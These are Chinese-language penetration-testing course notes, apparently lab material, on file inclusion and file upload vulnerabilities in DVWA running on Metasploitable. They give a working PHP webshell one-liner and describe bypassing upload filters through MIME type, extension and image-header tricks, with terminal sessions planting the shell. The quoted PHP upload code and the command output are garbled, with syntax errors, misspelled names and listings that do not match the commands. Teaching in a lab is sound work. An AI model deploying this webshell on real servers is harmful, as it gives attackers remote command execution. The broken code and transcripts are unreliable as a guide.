@@ -1,0 +1,214 @@
+课时87 手动漏洞挖掘（四）
+
+手动漏洞挖掘
+本地文件包含lfi
+    查看文件
+    代码执行
+        <?php echo shell_exec($_GET['cmd']);?>
+        Apache access.log
+远程文件包含rfi
+    出现概率少于lfi，但更容易被利用
+    /usr/share/wfuzz/wordlist/vulns/
+
+手动漏洞挖掘
+文件上传漏洞
+    <?php echo shell_exec($_GET['cmd']);?>
+直接上传webshell
+修改文件类型上传webshell
+    Mimetype----文件头、扩展名
+修改扩展名上传webshell
+    静态解析文件扩展名时可能无法执行
+文件头绕过过滤上传webshell
+上传目录权限
+
+root@kali:~# vi 1.oho
+ <?php echo shell_exec($_GET['cmd']);?>
+
+-------------------------------------------------------------------------
+低安全代码
+<?php
+    if (isset($_POST['Upload'])) {
+    
+        $target_path = DVWA_WEB_PAGE_TO_ROOT "hackable/uploads/";
+        $target_path = $target_path . basename( $_FILES['uploade']['name']
+
+        if(!move_uploaded_file($_FILES('uploaded']['tmp_name']. $target_path)) {
+
+            echo '<pre>';
+            echo 'Your image was not uploaded.';
+            echo  '</pre>';
+
+         } else {
+
+            echo '<pre>';
+            echo $target_path . ' successfully uploaded!';
+            echo '</pre>';
+
+         }
+
+    }
+?>
+----------------------------------------------------------------------------
+中安全代码
+<?php
+    if (isset($_POST['Upload'])) {
+    
+        $target_path = DVWA_WEB_PAGE_TO_ROOT "hackable/uploads/";
+        $target_path = $target_path . basename( $_FILES['uploade']['name']
+        $uploaded_name = $_FILES['uploade']['name']
+        $uploaded_name = $_FILES['uploade']['type']
+        $uploaded_name = $_FILES['uploade']['size']
+
+        if(!move_uploaded_file($_FILES('uploaded']['tmp_name']. $target_path)) {
+
+            echo '<pre>';
+            echo 'Your image was not uploaded.';
+            echo  '</pre>';
+
+         } else {
+
+            echo '<pre>';
+            echo $target_path . ' successfully uploaded!';
+            echo '</pre>';
+
+         }
+
+    }
+?>
+-------------------------------------------------------------------------------------
+
+msfadmin@metasploitable:~$ cd /var/www/dvwa/hackable/uploads/
+
+msfadmin@metasploitable:/var/www/dvwa/hackable/uploads$ sudo rm 1*
+
+msfadmin@metasploitable:/var/www/dvwa/hackable/uploads$ sudo rm 1.png
+
+msfadmin@metasploitable:/var/www/dvwa/hackable/uploads$ ls
+dvwa_email.png
+
+root@kali:~# minetype
+
+root@kali:~# minetype 1.php
+1.php: application/x-php
+
+root@kali:~# cd 桌面/
+
+root@kali:~/桌面# minetype 1.png
+1.png: image/png
+
+root@kali:~/桌面# minetype 1.jpg
+1.jpg: image/jpeg
+
+root@kali:~/桌面# cd ..
+
+root@kali:~/# ls
+1.php    hs_err_pid2958.log      公共  视频  文档  音乐
+?????    ZAP_2.4.3_Linux.tar.gz  模板  图片  下载  桌面
+
+root@kali:~/# 1.php
+
+root@kali:~/# cp 1.php a.jpg
+
+root@kali:~/# ls
+1.php  a.jpg                   hs_err_pid2958.log  模板  图片  下载  桌面
+?????  ZAP_2.4.3_Linux.tar.gz  公共                视频  文档  音乐
+
+root@kali:~/# minetype a.jpg
+a.jpg: applicaton/x-php
+
+-------------------------------------------------------------------------------
+高安全代码
+<?php
+    if (isset($_POST['Upload'])) {
+    
+        $target_path = DVWA_WEB_PAGE_TO_ROOT "hackable/uploads/";
+        $target_path = $target_path . basename( $_FILES['uploade']['name']
+        $uploaded_name = $_FILES['uploade']['name']
+        $uploaded_ext = substr($uploaded_name,strrpos($uploaded_name. '.') +1);
+        $uploaded_name = $_FILES['uploade']['size']
+        
+        if(($uploaded_ext == "jgp" || $uploaded_ext == "JPG" || $uploaded_ext == "jpeg" || $uploaded_ext == "JPEG") && ($uploaded_size < 100000)){
+
+            if(!move_uploaded_file($_FILES('uploaded']['tmp_name']. $target_path)) {
+
+                echo '<pre>';
+                echo 'Your image was not uploaded.';
+                echo  '</pre>';
+
+             } else {
+
+                echo '<pre>';
+                echo $target_path . ' successfully uploaded!';
+                echo '</pre>';
+
+             }
+
+        }
+    }
+?>
+---------------------------------------------------------------------------------
+
+msfadmin@metasploitable:/var/www/dvwa/hackable/uploads$ sudo rm *
+
+把图片信息删除，换成<?php echo shell_exec($_GET['cmd']);?>
+
+msfadmin@metasploitable:/var/www/dvwa/hackable/uploads$ ls
+2.jpg   2.php.jpeg
+
+msfadmin@metasploitable:/var/www/dvwa/hackable/uploads$ cat 2.jpeg
+cat: 2.jpeg: Permission denied
+
+msfadmin@metasploitable:/var/www/dvwa/hackable/uploads$ sudo cat 2.jpeg
+*PNG
+
+<?php echo shell_exec($_GET['cmd']);?>msfadmin@metasploitable:/var/www/dvwa/hackable/uploads$ sudo  cat 2.php.jpeg
+
+<?php echo shell_exec($_GET['cmd']);?>msfadmin@metasploitable:/var/www/dvwa/hackable/uploads$ ls -l
+total 8
+-rw------- 1 www-date www-data 46 2016-01-19 07:48 2.jpeg
+-rw------- 1 www-date www-data 46 2016-01-19 07:51 2.php.jpeg
+
+msfadmin@metasploitable:/var/www/dvwa/hackable/uploads$ cd ..
+
+msfadmin@metasploitable:/var/www/dvwa/hackable$ ls
+uploads  users
+
+msfadmin@metasploitable:/var/www/dvwa/hackable$ ls -l
+total 8
+-rw------- 1 www-date www-data 46 2016-01-19 07:51 uploads
+-rw------- 1 www-date www-data 46 2016-01-19 07:22 users
+
+msfadmin@metasploitable:/var/www/dvwa/hackable$ sudo chmod o-x uploads/
+
+msfadmin@metasploitable:/var/www/dvwa/hackable$ ls -l
+total 8
+-rw------- 1 www-date www-data 46 2016-01-19 07:51 uploads
+-rw------- 1 www-date www-data 46 2016-01-19 07:22 users
+
+msfadmin@metasploitable:/var/www/dvwa/hackable$ sudo -i
+
+msfadmin@metasploitable:~$ cd /var/www/dvwa/hackable/uploads/
+
+msfadmin@metasploitable:/var/www/dvwa/hackable/uploads$ ls -l
+total 8
+-rw------- 1 www-date www-data 46 2016-01-19 07:48 2.jpeg
+-rw------- 1 www-date www-data 46 2016-01-19 07:51 2.php.jpeg
+
+msfadmin@metasploitable:/var/www/dvwa/hackable$ cd ..
+
+msfadmin@metasploitable:/var/www/dvwa/hackable$ ls
+uploads  users
+
+msfadmin@metasploitable:/var/www/dvwa/hackable$ ls -l
+total 8
+drwxr-xr-- 1 www-date www-data 46 2016-01-19 07:51 uploads
+drwxr-xr-x 1 www-date www-data 46 2016-01-19 07:22 users
+
+msfadmin@metasploitable:/var/www/dvwa/hackable$ chmod a-x uploads/
+
+msfadmin@metasploitable:/var/www/dvwa/hackable$ ls -l
+total 8
+drw-r-xr-- 1 www-date www-data 46 2016-01-19 07:51 uploads
+drwxr-xr-x 1 www-date www-data 46 2016-01-19 07:22 users
+
+
